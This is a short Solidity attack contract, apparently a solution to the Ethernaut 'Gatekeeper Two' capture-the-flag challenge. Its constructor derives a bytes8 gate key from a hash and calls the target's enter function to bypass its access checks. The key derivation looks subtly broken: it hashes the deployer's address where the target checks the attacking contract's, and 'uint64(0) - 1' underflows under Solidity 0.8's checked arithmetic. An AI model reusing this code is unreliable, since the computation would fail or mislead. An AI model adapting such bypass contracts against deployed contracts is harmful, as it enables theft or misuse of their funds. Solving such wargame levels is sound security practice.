// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwoAttack {

    constructor(address _gatekeeper) {

        uint64 arg = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1;
        (bool success, ) = _gatekeeper.call(abi.encodeWithSignature('enter(bytes8)', bytes8(arg)));
        require(success);
    }


}